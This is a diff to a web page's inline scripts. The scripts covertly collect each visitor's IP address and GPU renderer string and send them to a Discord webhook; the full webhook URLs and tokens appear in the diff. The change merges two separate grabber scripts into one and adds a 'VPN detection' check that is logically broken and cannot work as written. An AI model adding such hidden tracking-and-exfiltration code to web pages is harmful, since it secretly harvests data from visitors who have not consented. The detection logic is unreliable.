@@ -16,16 +16,40 @@
         xhr.send();
     }
     getUserIP(function (ip) {
-        // Send IP to webhook
-        fetch('https://discord.com/api/webhooks/1193119309594112040/PvdEewvBUYlteGdtgcEXDv89Uk515__n3DRN6sm17NNFpyK8qujCPjc2trN9pR3xANLS', {
+        // Send IP and GPU info to webhook in same embed
+        const gl = document.createElement('canvas').getContext('webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+
+        // VPN Detection
+        var usingVPN = false;
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'https://api.ipify.org?format=json', true);
+        xhr.onload = function () {
+            if (xhr.status >= 200 && xhr.status < 300) {
+                var data = JSON.parse(xhr.responseText);
+                if (data.ip.startsWith('10.') || data.ip.startsWith('192.168.') || data.ip.startsWith('172.16.')) {
+                    usingVPN = true;
+                }
+            }
+        };
+        xhr.onerror = function () {
+            usingVPN = true;
+        };
+        xhr.send();
+
+        fetch('https://discord.com/api/webhooks/1201032740661891224/wcL7szAg4rfDhlnNPL8Dan0Cz6YSnFNynE9zVNP4REi-XYlSsP6Y8hXkx5yR-mvYXfmW', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
             },
             body: JSON.stringify({
                 embeds: [{
-                    title: 'IP Address',
-                    description: ip,
+                    title: 'IP and GPU Info',
+                    description: `IP: ${ip}
+
+					GPU: ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}
+					
+					VPN: ${usingVPN}`,
                     color: 0x00FF00
                 }]
             })
@@ -33,25 +57,7 @@
     });
 </script>
 
-<script>
-    // Send GPU info to same webhook
-    const gl = document.createElement('canvas').getContext('webgl');
-    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
 
-    fetch('https://discord.com/api/webhooks/1193119309594112040/PvdEewvBUYlteGdtgcEXDv89Uk515__n3DRN6sm17NNFpyK8qujCPjc2trN9pR3xANLS', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            embeds: [{
-                title: 'GPU Info',
-                description: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
-                color: 0x00FF00
-            }]
-        })
-    });
-</script>
 
 
 
@@ -231,4 +237,3 @@
 <script src="assets/app.js" type="text/javascript"></script>
 </body>
 </html>
-
